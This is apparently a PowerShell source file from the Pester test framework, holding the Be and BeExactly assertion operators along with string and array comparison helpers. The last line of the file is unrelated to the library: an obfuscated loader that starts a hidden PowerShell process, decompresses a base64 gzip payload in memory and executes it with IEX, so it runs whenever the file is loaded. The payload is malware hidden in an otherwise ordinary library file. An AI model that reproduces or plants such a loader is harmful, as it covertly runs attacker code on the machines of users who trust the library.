
function Should-Be ($ActualValue, $ExpectedValue, [switch] $Negate, [string] $Because) {
    
    [bool] $succeeded = ArraysAreEqual $ActualValue $ExpectedValue

    if ($Negate) {
        $succeeded = -not $succeeded
    }

    $failureMessage = ''

    if (-not $succeeded) {
        if ($Negate) {
            $failureMessage = NotShouldBeFailureMessage -ActualValue $ActualValue -Expected $ExpectedValue -Because $Because
        }
        else {
            $failureMessage = ShouldBeFailureMessage -ActualValue $ActualValue -Expected $ExpectedValue -Because $Because
        }
    }

    return & $SafeCommands['New-Object'] psobject -Property @{
        Succeeded      = $succeeded
        FailureMessage = $failureMessage
    }
}

function ShouldBeFailureMessage($ActualValue, $ExpectedValue, $Because) {
    
    $ActualValue = $($ActualValue)
    $ExpectedValue = $($ExpectedValue)

    if (-not (($ExpectedValue -is [string]) -and ($ActualValue -is [string]))) {
        return "Expected $(Format-Nicely $ExpectedValue),$(Format-Because $Because) but got $(Format-Nicely $ActualValue)."
    }
    
    (Get-CompareStringMessage -Expected $ExpectedValue -Actual $ActualValue -Because $Because) -join "`n"
}

function NotShouldBeFailureMessage($ActualValue, $ExpectedValue, $Because) {
    return "Expected $(Format-Nicely $ExpectedValue) to be different from the actual value,$(Format-Because $Because) but got the same value."
}

Add-AssertionOperator -Name               Be `
    -InternalName       Should-Be `
    -Test               ${function:Should-Be} `
    -Alias              'EQ' `
    -SupportsArrayInput


function Should-BeExactly($ActualValue, $ExpectedValue, $Because) {
    
    [bool] $succeeded = ArraysAreEqual $ActualValue $ExpectedValue -CaseSensitive

    if ($Negate) {
        $succeeded = -not $succeeded
    }

    $failureMessage = ''

    if (-not $succeeded) {
        if ($Negate) {
            $failureMessage = NotShouldBeExactlyFailureMessage -ActualValue $ActualValue -ExpectedValue $ExpectedValue -Because $Because
        }
        else {
            $failureMessage = ShouldBeExactlyFailureMessage -ActualValue $ActualValue -ExpectedValue $ExpectedValue -Because $Because
        }
    }

    return New-Object psobject -Property @{
        Succeeded      = $succeeded
        FailureMessage = $failureMessage
    }
}

function ShouldBeExactlyFailureMessage($ActualValue, $ExpectedValue, $Because) {
    
    $ActualValue = $($ActualValue)
    $ExpectedValue = $($ExpectedValue)

    if (-not (($ExpectedValue -is [string]) -and ($ActualValue -is [string]))) {
        return "Expected exactly $(Format-Nicely $ExpectedValue),$(Format-Because $Because) but got $(Format-Nicely $ActualValue)."
    }
    
    (Get-CompareStringMessage -Expected $ExpectedValue -Actual $ActualValue -CaseSensitive -Because $Because) -join "`n"
}

function NotShouldBeExactlyFailureMessage($ActualValue, $ExpectedValue, $Because) {
    return "Expected $(Format-Nicely $ExpectedValue) to be different from the actual value,$(Format-Because $Because) but got exactly the same value."
}

Add-AssertionOperator -Name               BeExactly `
    -InternalName       Should-BeExactly `
    -Test               ${function:Should-BeExactly} `
    -Alias              'CEQ' `
    -SupportsArrayInput



function Get-CompareStringMessage {
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [String]$ExpectedValue,
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [String]$Actual,
        [switch]$CaseSensitive,
        $Because
    )

    $ExpectedValueLength = $ExpectedValue.Length
    $actualLength = $actual.Length
    $maxLength = $ExpectedValueLength, $actualLength | & $SafeCommands['Sort-Object'] -Descending | & $SafeCommands['Select-Object'] -First 1

    $differenceIndex = $null
    for ($i = 0; $i -lt $maxLength -and ($null -eq $differenceIndex); ++$i) {
        $differenceIndex = if ($CaseSensitive -and ($ExpectedValue[$i] -cne $actual[$i])) {
            $i
        }
        elseif ($ExpectedValue[$i] -ne $actual[$i]) {
            $i
        }
    }

    if ($null -ne $differenceIndex) {
        "Expected strings to be the same,$(Format-Because $Because) but they were different."

        if ($ExpectedValue.Length -ne $actual.Length) {
            "Expected length: $ExpectedValueLength"
            "Actual length:   $actualLength"
            "Strings differ at index $differenceIndex."
        }
        else {
            "String lengths are both $ExpectedValueLength."
            "Strings differ at index $differenceIndex."
        }
        $ellipsis = "..."
        $excerptSize = 5;
        "Expected: '{0}'" -f ( $ExpectedValue | Format-AsExcerpt -startIndex $differenceIndex -excerptSize $excerptSize  -excerptMarker $ellipsis | Expand-SpecialCharacters )
        "But was:  '{0}'" -f ( $actual | Format-AsExcerpt -startIndex $differenceIndex -excerptSize $excerptSize -excerptMarker $ellipsis | Expand-SpecialCharacters )

    }
}
function Format-AsExcerpt {
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [AllowEmptyString()]
        [string]$InputObject,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [int]$startIndex,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [int]$excerptSize,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [string]$excerptMarker
    )
    $InputObjectDisplay=""
    $displayDifferenceIndex = $startIndex - $excerptSize
    $maximumStringLength = 40
    $maximumSubstringLength = $excerptSize * 2
    $substringLength = $InputObject.Length - $displayDifferenceIndex
    if ($substringLength -gt $maximumSubstringLength) {
        $substringLength = $maximumSubstringLength
    }
    if ($displayDifferenceIndex + $substringLength -lt $InputObject.Length) {
        $endExcerptMarker = $excerptMarker
    }
    if ($displayDifferenceIndex -lt 0) {
        $displayDifferenceIndex = 0
    }
    if ($InputObject.length -ge $maximumStringLength) {
        if ($displayDifferenceIndex -ne 0) {
            $InputObjectDisplay = $excerptMarker
        }
        $InputObjectDisplay += $InputObject.Substring($displayDifferenceIndex, $substringLength) + $endExcerptMarker
    }
    else {
        $InputObjectDisplay = $InputObject
    }
    $InputObjectDisplay
}



function Expand-SpecialCharacters {
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [AllowEmptyString()]
        [string[]]$InputObject)
    process {
        $InputObject -replace "`n", "\n" -replace "`r", "\r" -replace "`t", "\t" -replace "`0", "\0" -replace "`b", "\b"
    }
}

function ArraysAreEqual {
    param (
        [object[]] $First,
        [object[]] $Second,
        [switch] $CaseSensitive,
        [int] $RecursionDepth = 0,
        [int] $RecursionLimit = 100
    )
    $RecursionDepth++

    if ($RecursionDepth -gt $RecursionLimit) {
        throw "Reached the recursion depth limit of $RecursionLimit when comparing arrays $First and $Second. Is one of your arrays cyclic?"
    }

    
    
    
    $firstNullOrEmpty = ArrayOrSingleElementIsNullOrEmpty -Array @($First)
    $secondNullOrEmpty = ArrayOrSingleElementIsNullOrEmpty -Array @($Second)

    if ($firstNullOrEmpty -or $secondNullOrEmpty) {
        return $firstNullOrEmpty -and $secondNullOrEmpty
    }

    if ($First.Count -ne $Second.Count) {
        return $false
    }

    for ($i = 0; $i -lt $First.Count; $i++) {
        if ((IsArray $First[$i]) -or (IsArray $Second[$i])) {
            if (-not (ArraysAreEqual -First $First[$i] -Second $Second[$i] -CaseSensitive:$CaseSensitive -RecursionDepth $RecursionDepth -RecursionLimit $RecursionLimit)) {
                return $false
            }
        }
        else {
            if ($CaseSensitive) {
                $comparer = { param($Actual, $Expected) $Expected -ceq $Actual }
            }
            else {
                $comparer = { param($Actual, $Expected) $Expected -eq $Actual }
            }

            if (-not (& $comparer $First[$i] $Second[$i])) {
                return $false
            }
        }
    }

    return $true
}

function ArrayOrSingleElementIsNullOrEmpty {
    param ([object[]] $Array)

    return $null -eq $Array -or $Array.Count -eq 0 -or ($Array.Count -eq 1 -and $null -eq $Array[0])
}

function IsArray {
    param ([object] $InputObject)

    
    
    return $InputObject -is [Array]
}

function ReplaceValueInArray {
    param (
        [object[]] $Array,
        [object] $Value,
        [object] $NewValue
    )

    foreach ($object in $Array) {
        if ($Value -eq $object) {
            $NewValue
        }
        elseif (@($object).Count -gt 1) {
            ReplaceValueInArray -Array @($object) -Value $Value -NewValue $NewValue
        }
        else {
            $object
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMeugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknvcZy2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23zmG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIaEXMd4Tn19qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOSgUBy6VBEkjZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5gBF6B67zOzxkUtLcNtTpMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQmHbtYgxZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZbVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kMs+phK0HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

